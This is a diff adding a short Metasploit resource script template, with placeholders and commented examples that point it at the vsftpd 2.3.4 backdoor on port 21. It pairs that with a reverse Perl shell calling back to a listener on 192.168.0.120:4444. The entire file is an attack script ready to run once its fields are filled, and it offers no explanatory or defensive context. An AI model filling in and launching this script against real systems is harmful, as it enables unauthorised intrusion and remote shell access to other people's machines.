@@ -1,0 +1,8 @@
+# Metasploit resource script
+use <exploit_module>  # Example: exploit/unix/ftp/vsftpd_234_backdoor
+set RHOSTS <target_ip>  # Example: 192.168.0.110
+set RPORT <target_port>  # Example: 21
+set PAYLOAD <payload>  # Example: payload/unix/reverse_perl
+set LHOST <local_ip>  # Example: 192.168.0.120 (local machine IP)
+set LPORT <local_port>  # Example: 4444 (local port for reverse shell)
+run
